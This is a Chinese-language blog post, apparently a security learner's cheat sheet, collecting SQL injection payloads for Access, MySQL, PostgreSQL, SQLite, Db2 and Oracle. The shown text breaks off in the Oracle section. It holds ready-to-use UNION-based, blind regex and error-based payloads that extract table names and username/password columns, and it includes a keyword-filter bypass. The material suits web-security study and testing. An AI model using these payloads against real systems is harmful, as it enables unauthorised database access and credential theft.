@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Leihehe"><meta name="copyright" content="Leihehe"><meta name="generator" content="Hexo 5.4.2"><meta name="theme" content="hexo-theme-yun"><title>不同数据库的SQL注入集合 | LeiH - Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-okaidia.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/png" href="/logo.png"><link rel="mask-icon" href="/logo.png" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="preload" href="/js/prism.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"leihehe.top","root":"/","title":["LeiH's","Blog"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script src="/js/prism.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap"><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="ACCESS数据库注入（asp）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不同数据库的SQL注入集合">
+<meta property="og:url" content="https://leihehe.top/2021/06/06/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/index.html">
+<meta property="og:site_name" content="LeiH - Blog">
+<meta property="og:description" content="ACCESS数据库注入（asp）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leihehe.top/image/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/image-20210606182256848.png">
+<meta property="article:published_time" content="2021-06-06T06:28:59.000Z">
+<meta property="article:modified_time" content="2022-06-08T23:43:07.131Z">
+<meta property="article:author" content="Leihehe">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="SQL Injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leihehe.top/image/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/image-20210606182256848.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Leihehe"><img width="96" loading="lazy" src="/image/avatar.png" alt="Leihehe"></a><div class="site-author-name"><a href="/about/">Leihehe</a></div><span class="site-name">LeiH - Blog</span><sub class="site-subtitle"></sub><div class="site-desciption">我该说些什么呢？</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="我的主页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/about/"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span></a></div><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">39</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">18</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">23</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/leihehehe" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:hslscarlett@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="友情链接" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ACCESS%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%EF%BC%88asp%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">ACCESS数据库注入（asp）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">注入语法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">MYSQL数据库注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-1-%E9%80%9A%E7%94%A8%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">Phase 1: 通用注入语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-2-%E6%A0%B9%E6%8D%AE%E7%89%88%E6%9C%AC%E7%BB%A7%E7%BB%AD%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">Phase 2: 根据版本继续注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL-5-0%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">2.2.1.</span> <span class="toc-text">MYSQL 5.0以上版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL-5-0%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">MYSQL 5.0以下版本：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.1.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#floor-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">floor()报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UpdateXML-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">UpdateXML 报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Extractvalue-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">Extractvalue 报错注入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PostgreSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%E8%88%AC%E5%92%8CPHP%E6%90%AD%E9%85%8D%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">PostgreSQL注入（一般和PHP搭配）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlite%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">Sqlite注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">4.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-number">4.2.</span> <span class="toc-text">注入语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Db2%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">Db2注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-2"><span class="toc-number">5.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95-1"><span class="toc-number">5.2.</span> <span class="toc-text">注入语法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">Oracle注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-3"><span class="toc-number">6.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5-1"><span class="toc-number">6.2.</span> <span class="toc-text">注入语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mongodb%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">Mongodb注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-4"><span class="toc-number">7.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95-2"><span class="toc-number">7.2.</span> <span class="toc-text">注入语法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sybase-Sqlserver%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">Sybase&#x2F;Sqlserver注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlmap"><span class="toc-number">9.</span> <span class="toc-text">Sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0"><span class="toc-number">9.1.</span> <span class="toc-text">命令参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">9.2.</span> <span class="toc-text">常用语句 :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tamper%E4%BD%BF%E7%94%A8"><span class="toc-number">9.3.</span> <span class="toc-text">Tamper使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">9.4.</span> <span class="toc-text">命令执行</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://leihehe.top/2021/06/06/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Leihehe"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="LeiH - Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">不同数据库的SQL注入集合</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-06-06 16:28:59" itemprop="dateCreated datePublished" datetime="2021-06-06T16:28:59+10:00">2021-06-06</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="修改时间：2022-06-09 09:43:07" itemprop="dateModified" datetime="2022-06-09T09:43:07+10:00">2022-06-09</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="本文字数">4.1k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="阅读时长">19m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web-Security/" style="--text-color:#F4645F" itemprop="url" rel="index"><span itemprop="text">Web Security</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web-Security/Sql%E6%B3%A8%E5%85%A5/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Sql注入</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web-Security/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Web Security</span></a><a class="tag-item" href="/tags/SQL-Injection/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">SQL Injection</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h1 id="ACCESS数据库注入（asp）"><a href="#ACCESS数据库注入（asp）" class="headerlink" title="ACCESS数据库注入（asp）"></a>ACCESS数据库注入（asp）</h1><span id="more"></span>
+
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>一般用于ASP网站</strong></p>
+<p><strong>access数据库结构：table, column, data</strong></p>
+<p><strong>access数据库一般格式：xxx.mdb 数据库文件</strong></p>
+<h2 id="注入语法"><a href="#注入语法" class="headerlink" title="注入语法"></a>注入语法</h2><p>猜解table,column的名字需要用到字典</p>
+<p><strong>猜解列表个数</strong>：<code>order by 5;</code> -&gt; 按第五列排列，而数字表示第几个column，所以如果<code>order by 5</code>显示正常，但<code>order by 6;</code>不正常，说明这个table只有6个column.</p>
+<p><strong>猜解表名：</strong><code>union select 1,2,3,4,5 from admin</code> -&gt; 看admin这个table是否存在</p>
+<p><strong>猜解列名：</strong>根据页面返回的信息修改语句</p>
+<p><code>union select 1,2,3,4,5,6,7,8 from news</code></p>
+<p>比如在这个网站,我们猜出列表个数有八个,表名为news(只是演示,一般猜解管理员的表,如admin)<img src="/image/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/image-20210606182256848.png" alt="image-20210606182256848" loading="lazy"></p>
+<p>通过图片我们可以看出显示出了3,4,8个位置,<strong>这时我们只需要在这三个中的任一位置进行替代，替代为猜测的列名即可</strong></p>
+<p>比如在3的位置替代为password,若检测存在password这个列表，则会显示出来password明文</p>
+<p><strong>偏移注入：表名获取到了（字典），但列名没获取到</strong></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wxh0000mm/article/details/104451163">Access偏移注入与原理</a></p>
+<p>最后查看网页源码即可</p>
+<h1 id="MYSQL数据库注入"><a href="#MYSQL数据库注入" class="headerlink" title="MYSQL数据库注入"></a>MYSQL数据库注入</h1><h2 id="Phase-1-通用注入语法"><a href="#Phase-1-通用注入语法" class="headerlink" title="Phase 1: 通用注入语法"></a>Phase 1: 通用注入语法</h2><p><strong>注释符号：</strong><code>--+</code>或者<code>#</code></p>
+<p><strong>猜解列表个数</strong>：<code>order by 5;</code> -&gt; 按第五列排列，而数字表示第几个column，所以如果<code>order by 5</code>显示正常，但<code>order by 6;</code>不正常，说明这个table只有6个column.</p>
+<p><strong>猜解表名：</strong><code>union select 1,2,3,4,5 </code>;</p>
+<p>不同于Access数据库，这里可能看不到报错的数字，所以得在前面参数处报错 如<code>.php?id=-1</code> 或者 <code>.php?id=1 and 1=2</code>或者试试换id</p>
+<p><strong>在报错的数字位置替换：</strong></p>
+<ul>
+<li>查询数据库名: database()</li>
+<li>查询数据库版本：version()</li>
+<li>查询数据库用户：user()</li>
+<li>查询操作系统: @@version_compile_os</li>
+</ul>
+<p><strong>堆叠注入绕过关键词检测：</strong></p>
+<ul>
+<li>‘; SET @a=HEX;prepare execsql from @a; execute execsql; </li>
+</ul>
+<p>若数据库名有特殊符号如(){}之类的，可以用``反引号将其扩出来</p>
+<h2 id="Phase-2-根据版本继续注入"><a href="#Phase-2-根据版本继续注入" class="headerlink" title="Phase 2: 根据版本继续注入"></a>Phase 2: 根据版本继续注入</h2><h3 id="MYSQL-5-0以上版本："><a href="#MYSQL-5-0以上版本：" class="headerlink" title="MYSQL 5.0以上版本："></a>MYSQL 5.0以上版本：</h3><p><strong>information_schema.schemata</strong></p>
+<ul>
+<li>shcema_name 为数据库名信息</li>
+</ul>
+<p><strong>information_schema.tables</strong></p>
+<ul>
+<li>table_name 为表名信息</li>
+<li>table_schema 为数据库名</li>
+</ul>
+<p><strong>information_schema.columns</strong></p>
+<ul>
+<li>column_name 为列名信息</li>
+<li>table_name为表名信息</li>
+</ul>
+<p><strong>查表名:</strong></p>
+<p><code>and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;--+</code> </p>
+<p><strong>p.s:group_concat(table_name)意思说把所有表名获取出来</strong></p>
+<p><strong>查列名：</strong></p>
+<p><code>and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;--+</code></p>
+<p><strong>查数据(指定表名列名)：</strong></p>
+<p><code>union select 1,name,password,4 from StormGroup_member--+</code></p>
+<p><code>union select 1,group_concat(concat_ws(&#39;:&#39;,name,password)),3,4 from StormGroup_member--+</code></p>
+<p><code>union select 1,group_concat(name),group_concat(password),3,4 from StormGroup_member--+</code></p>
+<h3 id="MYSQL-5-0以下版本："><a href="#MYSQL-5-0以下版本：" class="headerlink" title="MYSQL 5.0以下版本："></a>MYSQL 5.0以下版本：</h3><p>可进行暴力猜解、配合文件读取尝试获取列名表名</p>
+<p>MYSQL 4.0: 读取源代码</p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>####正则注入</p>
+<p>正确返回1，错误返回0，可搭配if使用</p>
+<p><code>select user() regexp &#39;^[a-z]&#39;; -- 猜解第一个字符，为r</code></p>
+<p><code>select user() regexp &#39;^r[a-z]&#39;; -- 猜解第二个字符，为o</code></p>
+<p><code>select user() regexp &#39;^ro[a-z]&#39;; -- 猜解第三个字符，为o</code></p>
+<p><code>select user() regexp &#39;^roo[a-z]&#39;; -- 猜解第四个字符，为t</code></p>
+<p><code>...</code></p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>数据库需要开启报错提示</p>
+<h4 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h4><p><code>select 1,count(*),concat(0x3a,0x3a,(version()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a %23</code></p>
+<p><strong>关键表被禁用：</strong></p>
+<p><code>select 1,count(*),concat(0x3a,0x3a,(version()),0x3a,0x3a,floor(rand(0)*2))a from (select null)b group by a %23;</code></p>
+<p><strong>rand被禁用：</strong>可使用用户变量来报错</p>
+<p><code>select min(@a:=1) from information_schema.tables group by concat(user(),@a:=(@a+1)%2);</code></p>
+<p><strong>补充floor()报错注入原理：待续</strong></p>
+<h4 id="UpdateXML-报错注入"><a href="#UpdateXML-报错注入" class="headerlink" title="UpdateXML 报错注入"></a>UpdateXML 报错注入</h4><ul>
+<li><p>适用于mysql5.1.5+,最长32位</p>
+</li>
+<li><p>updatexml(a,<strong>b</strong>,c); </p>
+<ul>
+<li>a: XML文档对象的名称-&gt;string</li>
+<li><strong>b: Xpath格式的string,若不符合该格式则报错</strong></li>
+<li>c: new value -&gt; String</li>
+</ul>
+</li>
+</ul>
+<p><code>and updatexml(1,concat(0x7e,(payload)),1);</code></p>
+<h4 id="Extractvalue-报错注入"><a href="#Extractvalue-报错注入" class="headerlink" title="Extractvalue 报错注入"></a>Extractvalue 报错注入</h4><ul>
+<li>适用于mysql5.1.5+,最长32位</li>
+<li>ExtractValue(xml_flag, <strong>xpath_expr</strong>)<ul>
+<li>xml_flag: 传入目标xml文档</li>
+<li><strong>xpath_expr</strong>: <strong>Xpath格式的查找路径，若不符合该格式则报错</strong></li>
+<li>用法：获取xml_flag这个文档下xpath_expr里的东西</li>
+</ul>
+</li>
+</ul>
+<p><code>and extractvalue(1,concat(0x7e,(payload)))</code></p>
+<h1 id="PostgreSQL注入（一般和PHP搭配）"><a href="#PostgreSQL注入（一般和PHP搭配）" class="headerlink" title="PostgreSQL注入（一般和PHP搭配）"></a>PostgreSQL注入（一般和PHP搭配）</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/she11s/p/12326629.html">Sql注入之Postgresql</a></p>
+<p><strong>PostgreSQL注入和MYSQL很像，只是语句有些不同</strong></p>
+<p><strong>判断：and 1=1 and 1=2</strong></p>
+<p><strong>回显位置：union select null, ‘1’,’1’,null</strong></p>
+<p><strong>查询表名、列名的时候每次只会显示一个，所以可以在后面加上 <code>limit 1 offset 0</code> ，通过增加offset可以依次得到剩下的表名、列名</strong></p>
+<h1 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a>Sqlite注入</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>sqlite中会有一个隐藏表 <strong>sqlite_master</strong></p>
+<h2 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h2><p><strong>查询列表个数</strong>：<code>order by 4</code></p>
+<p><strong>获取表的信息</strong>：<code>union select 1,name,sql,4 from sqlite_master</code></p>
+<p><code>sql</code>是数据库被创建时的执行语句</p>
+<p><strong>获取数据：</strong><code>union select 1,name,password,4 from 获取的表名</code></p>
+<h1 id="Db2注入"><a href="#Db2注入" class="headerlink" title="Db2注入"></a>Db2注入</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p><strong>tabschema</strong>：数据库名 </p>
+<p><strong>current schema</strong>：数据库名的列名</p>
+<p><strong>table_name</strong>：表名 </p>
+<p><strong>tabname</strong>：表名的列名</p>
+<p><strong>column_name</strong>：列名的列名</p>
+<p><strong>sysibm.sysdummy1</strong> 记录数据库名的信息</p>
+<p><strong>syscat.tables</strong>：记录表名的信息</p>
+<p><strong>sysibm.columns</strong>：记录列名的信息</p>
+<h2 id="注入语法-1"><a href="#注入语法-1" class="headerlink" title="注入语法"></a>注入语法</h2><p><strong>1、猜数</strong></p>
+<p><code>order by 4</code></p>
+<p><code>union select 1,2,3,4 from sysibm.systables</code></p>
+<p><strong>2、爆库：</strong></p>
+<p><code>union select 1,2,current schema,4 from sysibm.sysdummy1</code></p>
+<p><strong>3、爆表：</strong></p>
+<p><code>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 0,1</code></p>
+<p><code>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 1,1</code></p>
+<p><strong>4、爆列：</strong></p>
+<p><code>union select 1,2,column_name,4 from sysibm.columns where table_schema=current schema and table_name=&#39;GAME_CHARACTER&#39; limit 0,1</code></p>
+<p><strong>5、爆数据：</strong></p>
+<p><code>union select 1,name,password,4 from GAME_CHARACTER limit 0,1</code></p>
+<p><code>union select 1,name,password,4 from GAME_CHARACTER limit 1,1</code></p>
+<h1 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h1><h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p><strong>参考：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">【实战】Oracle注入总结</a></a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35569814/article/details/100517122">Oracle注入</a></p>
+<p><strong>all_tables</strong> 查询出所有的表</p>
+<p><strong>user_tables</strong> 查询出当前用户的表</p>
+<p><strong>all_tab_columns</strong> 查询出所有的字段</p>
+<p><strong>user_tab_columns</strong>  查询出当前用户的字段</p>
+<p><strong>v$version</strong> 查版本</p>
+<p><strong>大小写:在Oracle中： 双引号的作用是：假如建立对象的时候，对象名、字段名加双引号，则示意Oracle将严格区分大小写，否则Oracl都默认大写。 而单引号则示意：这个加了单引号的字段是一个字类似字符串，并不区分大小写。 当指定字符串文本时，必须用单引号将字符串文本引住</strong></p>
+<p><strong>注释符号：–</strong></p>
+<h2 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h2><p><strong>1.查询个数</strong></p>
+<p>order by 2</p>
+<p><strong>2.查询表名格式</strong></p>
+<p><code>union select null,null from dual</code></p>
+<p><code>union select &#39;null&#39;,null from dual</code></p>
+<p><code>union select &#39;null&#39;,&#39;null&#39; from dual</code></p>
+<p><strong>3.查询获取表名(筛选,搜索)</strong></p>
+<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1) from dual</code></p>
+<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1) from dual</code></p>
